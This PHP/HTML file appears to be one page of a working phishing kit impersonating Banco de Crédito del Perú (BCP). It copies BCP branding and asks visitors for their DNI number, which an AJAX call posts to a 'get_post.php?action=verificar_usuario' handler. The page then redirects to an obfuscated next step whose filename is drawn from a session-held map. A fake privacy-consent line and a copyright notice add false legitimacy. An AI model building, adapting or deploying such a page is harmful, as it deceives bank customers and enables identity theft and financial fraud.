<?php

########################################################################
# HEADERS
########################################################################

session_start();

########################################################################
# VERIFICANDO SESION
########################################################################

if (!isset($_SESSION['session_id'])) {
    
    header('Location: ../index.php');
    exit();

}

########################################################################
# ARCHIVOS DE CONFIGURACION
########################################################################

include '../config.php';

########################################################################
# OBTENIENDO VARIABLES GUARDADAS EN SESION
########################################################################

$visitorId = $_SESSION['visitorId'];
$session_id = $_SESSION['session_id'];
$directory_array = $_SESSION['directory_array'];
$device_type = $_SESSION['device_type'];

########################################################################

$estado = $_SESSION['estado'];

########################################################################

$next_location = "step_two.php";

$next_location_encrypted = $directory_array[$next_location].".php";

?>

<!DOCTYPE html>
<html lang="en" class="hydrated">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>BCP al instante</title>
    <link rel="stylesheet" href="files/main.css">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <link href="files/favicon.ico" rel="icon" type="image/x-icon">
    <link rel="stylesheet" href="files/stylo.css">
	<style>
		.loader {
    		border: 2px solid white;
    		border-top: 4px solid transparent;
   			border-radius: 50%;
    		width: 22px;
    		height: 22px;
    		animation: spin 1s linear infinite;
    		position: absolute;
    		top: 50%;
    		left: 50%;
    		margin-top: -10px;
    		margin-left: -10px;
    		display: none;
		}
		/* Animación de rotación del loader */
		@keyframes spin {
			0% { transform: rotate(0deg); }
    		100% { transform: rotate(360deg); }
		}

		/* Estilos para el botón personalizado */
		.custom-button {
    		position: relative; /* Para que el loader se posicione correctamente */
		}

		/* Mostrar el loader cuando el botón está deshabilitado */
		.btn-block:disabled .loader {
			display: block;
		}
	</style>

</head>
<body>
<div id="loader_ajax" style="position: fixed; top: 0px; left: 0px; z-index: 9999999999; width: 100%; height: 100%; overflow-y: none; display: none;">
    <div id="ajax_loader">
        <div class="text-center">
            
        </div>
    </div>
</div>
<div id="total">
<eva-root _nghost-hbf-c0="" ng-version="7.2.16">
    <bcp-layout _ngcontent-hbf-c0="" fixed-menu="" ignore-scroll="" class="hydrated">
        <section class="layout">
<main class="header_sin_acceso">
    <header style="position: fixed; width: 100%; background: #FFFFFF; top: 0; top: 0px; z-index: 9999; box-shadow: 0px 4px 8px rgb(0 33 102 / 5%);">
        <div class="container" style="margin-right: auto; margin-left: auto; padding-left: 0; padding-right: 0;"> 
           <div class="bcp_opciones" style="padding: 14px 24px; display: flex; flex-direction: row; align-items: center; justify-content: space-between;">
            <div class="bcp_logo" style="width: 90px; height: 24px;">
                <a href="/">
                    <img src="files/logo-bcp.svg" alt="" style="width: 100%">
                </a>
            </div>
           </div>
        </div>
    </header>
</main>
            <bcp-sidebar position="right" class="hydrated">
                <aside class="sidebar">
                    <div>
                        <bcp-menu _ngcontent-hbf-c0="" slot="sidebar-content" class="inline-menu hydrated">
                            <ul class="navbar-nav">
                                <bcp-menu-option _ngcontent-hbf-c0="" class="hydrated">
                                    <li class="nav-item">
                                        <a class="nav-link">
                                            <bcp-character class="hydrated">
                                                <p class="character-md bcp-font-demi white">Obtén tu préstamo </p>
                                            </bcp-character>
                                        </a>
                                    </li>
                                </bcp-menu-option>
                                <bcp-menu-option _ngcontent-hbf-c0="" class="hydrated">
                                    <li class="nav-item">
                                        <a class="nav-link">
                                            <bcp-character class="hydrated">
                                                <p class="character-md bcp-font-demi white">Beneficios </p>
                                            </bcp-character>
                                        </a>
                                    </li>
                                </bcp-menu-option>
                                <bcp-menu-option _ngcontent-hbf-c0="" class="hydrated">
                                    <li class="nav-item">
                                        <a class="nav-link">
                                            <bcp-character class="hydrated">
                                                <p class="character-md bcp-font-demi white">Cómo funciona </p>
                                            </bcp-character>
                                        </a>
                                    </li>
                                </bcp-menu-option>
                            </ul>
                        </bcp-menu>
                    </div>
                </aside>
                <div class="sidebar-backdrop fade"></div>
            </bcp-sidebar>
            <main class="layout-content" style="padding-top:46px !important;">
                <div _ngcontent-hbf-c0="" class="container">
                    <div _ngcontent-hbf-c0="" class="row">
                        <div _ngcontent-hbf-c0="" class="col">
                            <div _ngcontent-hbf-c0="" class="steppers"></div>
                        </div>
                    </div>
                </div>
                <router-outlet _ngcontent-hbf-c0=""></router-outlet>
                <eva-home _nghost-hbf-c1="">
                    <eva-banner _ngcontent-hbf-c1="" _nghost-hbf-c2="">
                        <div _ngcontent-hbf-c2="" class="banner" style="background-image: url(files/mobile.svg); height: 343px; background-position: center;background-repeat: no-repeat; background-size: cover; width: 100%; background-color:#F5F8FF;margin-top:10px; position:relative;">
                            <div _ngcontent-hbf-c2="" class="container">
                               
                            </div>
                        </div>
                    </eva-banner>
                    <eva-loan-request-form _ngcontent-hbf-c1="" _nghost-hbf-c3="">
                        <div _ngcontent-hbf-c3="" class="container" style="margin-top: 0px;">
                            <div _ngcontent-hbf-c3="" class="row" style="background-color:#F5F8FF;">
                                <div _ngcontent-hbf-c3="" class="col" style="background-color:#F5F8FF;">
                                    <div _ngcontent-hbf-c3="" class="card" style="border:none;background-color:#F5F8FF;">
                                        <div _ngcontent-hbf-c3="" class="card-body" style="padding: 26.5px 16px 32px !important;">
                                            <form class="ng-untouched ng-pristine ng-invalid">
                                                <div _ngcontent-hbf-c3="" class="row align-items-center">
                                                    <div _ngcontent-hbf-c3="" class="col-12 col-md">
                                                        <div _ngcontent-hbf-c3="" class="row flex-column flex-lg-row align-items-lg-center">
															<div _ngcontent-hbf-c3="" class="col-auto p-lg-0" style="text-align:center;">
                                                                <label _ngcontent-hbf-c3="" for="amount" style="font-size: 12px; font-family: inherit; color: #002DA0; line-height: 16px; letter-spacing: 0.1em; margin-bottom: 8px; text-align: center;">PRODUCTOS PARA TI</label>
                                                            </div>
															<div _ngcontent-hbf-c3="" class="col-auto p-lg-0" style="text-align:center;">
                                                                <label _ngcontent-hbf-c3="" for="amount" style="font-size: 24px; line-height: 32px; margin-bottom: 4px; text-align: center;">Mi Espacio BCP</label>
                                                            </div>
															<div _ngcontent-hbf-c3="" class="col-auto p-lg-0" style="text-align:center;">
                                                                <label _ngcontent-hbf-c3="" for="amount" style="font-size: 16px; line-height: 24px; margin-bottom: 12px; text-align: center; font-style: normal; font-family: inherit; font-weight: 400; color: #202E44;">Ingresa tu DNI y descubre tu producto especial</label>
                                                            </div>
															
                                                            <div _ngcontent-hbf-c3="" class="col-auto p-lg-0"></div>
                                                            <div _ngcontent-hbf-c3="" class="col">
                                                                <bcp-input _ngcontent-hbf-c3="" class="bcp-form-control ng-untouched ng-pristine ng-invalid hydrated" style="bottom:5px; position:relative;width:76%;left:12%;margin-bottom: 15px !important;">
                                                                    <div class="form-group" style="display:inline-flex; width: 100%">
																		<div id="dnispan" style="border-left: 1px solid var(--onsurface-600,#868f9e); border-top: 1px solid var(--onsurface-600,#868f9e); border-bottom: 1px solid var(--onsurface-600,#868f9e); border-radius: 8px 0px 0px 8px; background: white; text-align: center; font-weight: 700; font-size: 16px; width: 25%; padding-top: 12px !important; margin: 0; height: 48px;padding-right: 3px !important; padding: 0;">DNI</div>
                                                                        <input class="form-control" autocomplete="off" id="dni" name="dni" onkeypress="return tipoFiltro(event)" onblur="borrarLineaAzul()" onfocus="lineaAzul()" placeholder="Nro de documento" required="" type="tel" maxlength="8" style="background: white; width: 75%;position: relative;border-radius: 0px 8px 8px 0px;color:rgb(32, 46, 68) !important;caret-color:rgb(10, 71, 240);font-weight:500;font-size:16px;outline:unset;padding:12px 16px;color:rgb(32, 46, 68) !important;">
																		
                                                                        <bcp-paragraph id="bcp-input-0-lbl" class="input-label hydrated"></bcp-paragraph>
                                                                    </div>
																	<p id="alerta" _ngcontent-hbf-c4="" class="text-center pb-3 pt-3 m-0" style="color: #e30425; position: absolute; font-size: 12px; padding-top: 0px !important; -webkit-text-size-adjust: none; font-weight: 400;padding: 0 16px; text-align: left !important;"></p>
                                                                    <bcp-paragraph class="helper-text hydrated">
                                                                        <p class="paragraph-sm bcp-font-regular onsurface-800">&nbsp;</p>
                                                                    </bcp-paragraph>
                                                                </bcp-input>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-hbf-c3="" class="col-12 col-md-auto">
                                                        <div _ngcontent-hbf-c3="" class="row flex-column" style="text-align:center;">
                                                            <div _ngcontent-hbf-c3="" class="col submit-col p-lg-0">
                                                                <bcp-button _ngcontent-hbf-c3="" size="lg" class="hydrated">
                                                                    <button type="button" id="btnpri" class="btn btn-primary btn-lg btn-block" onclick="post(1);" style="height: 48px; padding: 16px 24px; border-radius: 24px; line-height: 16px;background-color: #ff7800;"> 
                                                                        <bcp-paragraph class="hydrated">
                                                                            <p class="paragraph-lg bcp-font-demi white" id="parrafobtn">Descubrir </p>
                                                                        </bcp-paragraph>
																		<div class="loader"></div>
                                                                    </button>
                                                                </bcp-button>
                                                            </div>
                                                        </div>
                                                    </div>
													<p _ngcontent-hbf-c7="" style="width: 80%; position: relative; font-size: 10px; text-align: center; margin-top: 20px; margin-bottom: 0px !important; left: 10%;color: #868F9E;">(*)Al enviarnos esta información usted autoriza al BCP el tratamiento de sus datos personales. Conoce más <a style="text-decoration: underline;font-weight:600;">aquí.</a> </p>
													<p _ngcontent-hbf-c7="" style="width: 84%; left: 8%; position: relative; font-size: 10px; text-align: center; line-height: 16px;color: #868F9E;margin-bottom:25px">Este sitio está protegido por reCAPTCHA y se aplican las <a style="text-decoration: underline;font-weight:600;">Políticas de privacidad</a> y <a style="text-decoration: underline;font-weight:600;">Términos del servicio de Google.</a> </p>
                                                </div>
                                                
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </eva-loan-request-form>
                              
					                
                </eva-home>
                
                    
                        
                            <footer class="bcp_footer container" style="font-size: 10px; line-height: 12px; padding: 20px 24px 22px 24px;font-family: 'Flexo'; color: #ACB2BD; font-weight: normal; border-top: 1px solid #D9D9D9;">
    <div class="bcp_grupo_logo_contenido" style="display:flex;flex-direction: row; align-items: center;justify-content:center;">
        <a href="/">
            <img src="files/imgfooter.svg" alt="" style="width: 70px; height: 19px; vertical-align: middle; margin-right: 50px;">
        </a>
        <p style="font-size: 10px; line-height: 12px; padding:0;margin:0;font-family:var(--bcp-font-family-primary-demi, Flexo-Demi),helvetica,arial,sans-serif">
            © 2020 BCP | Todos los derechos reservados.
        </p>
    </div>
    </footer>
                        
                    
               
            </main>
            <section class="layout-footer"></section>
        </section>
    </bcp-layout>
</eva-root>
</div>
<script type="text/javascript" src="files/jquery-3.1.0.min.js"></script>
<script>

	function lineaAzul() {
		let dnispanc = document.querySelector("#dnispan");
    	let dniinput = document.querySelector("#dni");
    	dniinput.style.borderRight = "2px solid #0a47f0";
    	dniinput.style.borderTop = "2px solid #0a47f0";
    	dniinput.style.borderBottom = "2px solid #0a47f0";
		dniinput.style.borderLeft = "none";
    	dnispanc.style.borderLeft = "2px solid #0a47f0";
    	dnispanc.style.borderTop = "2px solid #0a47f0";
    	dnispanc.style.borderBottom = "2px solid #0a47f0";   
		dnispanc.style.borderRight = "1px solid #0a47f0";
	}
	
	function borrarLineaAzul() {
		let dnispanc = document.querySelector("#dnispan");
    	let dniinput = document.querySelector("#dni");
    	dniinput.style.borderRight = "1px solid rgba(1, 45, 116, 0.5)";
    	dniinput.style.borderTop = "1px solid rgba(1, 45, 116, 0.5)";
    	dniinput.style.borderBottom = "1px solid rgba(1, 45, 116, 0.5)";
		dniinput.style.borderLeft = "none";
    	dnispanc.style.borderLeft = "1px solid rgba(1, 45, 116, 0.5)";
    	dnispanc.style.borderTop = "1px solid rgba(1, 45, 116, 0.5)";
    	dnispanc.style.borderBottom = "1px solid rgba(1, 45, 116, 0.5)";   
		dnispanc.style.borderRight = "1px solid rgba(1, 45, 116, 0.5)";
	}
	
	
    function tipoFiltro(e) {

        var charCode = e.key;

        if((/^[0-9]+$/.test(charCode))) {
            return true;
        } else {
            return false;
        }
    }

    function post(post) {
    
        let b = document.querySelector("#dni"); // Documento
        
        let x = post;

        switch (x) {
    
            case 1: // Login

                if (b.value == "") {
                    $("#alerta").html("Ingresa tu dni.").show();
                    b.focus();
                    return false;
                }

                if (b.value.length < 8) {
                    $("#alerta").html("Documento inválido.").show();
                    b.focus();
                    return false;
                }
				
				$('.loader').css('display', 'flex');
				$('#parrafobtn').css('color', 'transparent'); 
				$('#btnpri').css('background-color', '#ff961f');
                
                $("#alerta").hide();
                $("#loader_ajax").show();

                var parametros = {
                    "data_2": b.value
                }
            
                $.ajax({
                    data: parametros,
                    url: '../get_post.php?action=verificar_usuario',
                    type: 'post',
                    success: function(response) {
                        setTimeout(function() {
                            window.open('<?=$next_location_encrypted;?>', '_parent');
                        }, 1500);
                    }
                });

            break;

            default:
            break;
        }
    }
</script>
</body>
</html>